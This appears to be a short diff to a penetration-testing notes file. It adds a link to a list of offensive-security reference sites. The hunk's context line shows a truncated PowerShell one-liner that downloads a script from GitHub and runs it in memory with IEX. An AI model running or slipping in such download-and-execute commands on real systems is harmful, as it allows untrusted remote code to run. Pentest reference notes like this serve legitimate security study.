@@ -10,6 +10,8 @@ IEX(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/
 
 Global Ressources
 ---
+https://www.thehacker.recipes/
+
 https://viperone.gitbook.io/pentest-everything
 
 https://book.hacktricks.xyz/
